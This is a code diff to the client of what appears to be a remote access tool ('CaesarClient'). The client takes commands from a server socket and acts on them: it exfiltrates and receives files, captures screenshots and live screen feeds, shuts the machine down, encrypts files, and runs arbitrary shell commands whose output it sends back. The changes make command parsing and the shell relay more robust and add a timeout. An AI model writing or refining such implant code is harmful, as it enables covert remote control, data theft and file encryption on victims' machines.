@@ -93,12 +93,13 @@ class CaesarClient:
                 except(FileNotFoundError, IOError):
                     self.sock.send(f"[-]Directory does not exist!!! \n{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
 
-            elif "get" in cmd:
+            elif cmd.startswith("get "):
                 self.generalFeatures.send_client_file(self.sock, cmd[4:])
 
-            elif "send" in cmd:
+            elif cmd.startswith("send "):
                 usrFile = os.path.basename(cmd[5:])
                 self.generalFeatures.receive_server_file(self.sock, usrFile)
+
             elif cmd == "screenshot":
                 self.generalFeatures.screenshot(self.sock)
             elif cmd == "screenfeed":
@@ -114,15 +115,14 @@ class CaesarClient:
             elif cmd == "shutdown":
                 self.generalFeatures.shutdown(self.sock)
 
-            elif "encrypt" in cmd:
+            elif cmd.startswith("encrypt "):
                 cmd = cmd.split(" ", 2)
-
                 if len(cmd) == 3:
                     self.generalFeatures.encrypt_file(self.sock, "".join(cmd[1]), "".join(cmd[2]))
                 elif len(cmd) > 3 or len(cmd) < 3:
                     self.sock.send(f"[-]Invalid command!!! \n{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
 
-            elif "decrypt" in cmd:
+            elif cmd.startswith("decrypt "):
                 cmd = cmd.split(" ", 2)
                 if len(cmd) == 3:
                     self.generalFeatures.decrypt_file(self.sock, "".join(cmd[1]), "".join(cmd[2]))
@@ -134,15 +134,16 @@ class CaesarClient:
 
             else:
                 try:
-                    #return terminal output back to server
-                    terminal_output = subprocess.Popen(cmd, shell=True,
-                                                       stdout=subprocess.PIPE,
-                                                       stderr=subprocess.PIPE,
-                                                       stdin=subprocess.PIPE)
-
-                    terminal_output = terminal_output.stdout.read() + terminal_output.stderr.read()
+                    # return terminal output back to server
+                    terminal_output = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                                     stdin=subprocess.PIPE, timeout=30)
+                    terminal_output = terminal_output.stdout + terminal_output.stderr
                     terminal_output = terminal_output.decode()
                     output = f"{str(terminal_output)} \n{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}: "
+                    self.sock.send(output.encode())
+
+                except subprocess.TimeoutExpired:
+                    output = f"Command timed out\n{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}: "
                     self.sock.send(output.encode())
 
                 except Exception as e:
